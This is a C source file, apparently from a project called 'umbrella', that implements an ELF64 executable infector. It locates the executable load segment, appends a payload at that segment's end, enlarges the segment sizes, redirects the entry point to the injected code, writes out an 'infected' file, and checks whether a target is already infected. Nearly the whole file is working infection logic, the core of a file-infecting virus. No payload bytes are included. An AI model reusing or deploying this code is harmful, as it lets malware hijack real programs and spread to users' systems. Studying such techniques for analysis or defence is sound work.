#include "umbrella.h"

Elf64_Phdr *find_exec_segment(void *map, size_t mapsize)
{
    Elf64_Ehdr *eh;
    Elf64_Phdr *ph;
    size_t i;

    if (!map || mapsize < sizeof(Elf64_Ehdr))
        return NULL;

    eh = (Elf64_Ehdr *)map;

    if (eh->e_phoff + eh->e_phnum * sizeof(Elf64_Phdr) > mapsize)
        return NULL;

    ph = (Elf64_Phdr *)((char *)map + eh->e_phoff);

    for (i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type == PT_LOAD && (ph[i].p_flags & PF_X))
            return &ph[i];
    }

    return NULL;
}

void *get_exec_segment_ptr(void *map, ElfInfo *info)
{
    if (!info || !map)
        return NULL;
    if (info->seg_filesz == 0)
        return NULL;
    
    return (char *)map + info->seg_offset;
}

unsigned char *save_original_text(unsigned char *text, size_t size)
{
    unsigned char *save;

    if(!text || !size)
        return NULL;
    
    save = malloc(size);
    if (!save)
        return NULL;
    
    memcpy(save, text, size);
    return (save);
}

size_t align_size(size_t size, size_t align)
{
    if (align == 0)
        return size;
    return (size + align - 1) & ~(align - 1);
}


int inject_payload(void *map, size_t mapsize,
                   ElfInfo *info,
                   unsigned char *payload, size_t payload_size,
                   uint64_t *old_entry)
{
    Elf64_Ehdr *eh;
    Elf64_Phdr *ph;

    unsigned char *segment_end;
    uint64_t new_entry;
    size_t aligned_size;

    if (!map || !info || !payload || payload_size == 0)
        return -1;

    eh = (Elf64_Ehdr *)map;
    ph = find_exec_segment(map, mapsize);
    if (!ph)
        return -1;

    aligned_size = align_size(payload_size, info->seg_align);

    if (info->seg_offset + info->seg_filesz + aligned_size > mapsize)
    {
        fprintf(stderr, "Not enough space to inject aligned payload\n");
        return -1;
    }

    if (old_entry)
        *old_entry = eh->e_entry;

    segment_end = (unsigned char *)map +
                  info->seg_offset + info->seg_filesz;

    memcpy(segment_end, payload, payload_size);

    if (aligned_size > payload_size)
        memset(segment_end + payload_size, 0,
               aligned_size - payload_size);

    new_entry = info->seg_vaddr + info->seg_filesz;

    ph->p_filesz += aligned_size;
    ph->p_memsz  += aligned_size;

    eh->e_entry = new_entry;

    return 0;
}


int write_infected_file(const char *output_path, void *map, size_t size)
{
    int fd;
    ssize_t written;

    if (!output_path || !map || size == 0)
        return -1;
    
    fd = open(output_path, O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd < 0)
    {
        perror("open output file");
        return (-1);
    }

    written = write(fd, map, size);
    if (written < 0 || (size_t)written != size)
    {
        perror("write");
        close(fd);
        return (-1);
    }

    if(close(fd) < 0)
    {
        perror("close");
        return (-1);
    }

    return (0);
}

int already_infected(void *map, ElfInfo *info)
{
    Elf64_Ehdr *eh;

    if(!map || !info)
        return (0);
    
    eh = (Elf64_Ehdr *)map;

    if(eh->e_entry >= info->seg_vaddr && eh->e_entry < info->seg_vaddr + info->seg_memsz)
        return (1);
    return (0);
}
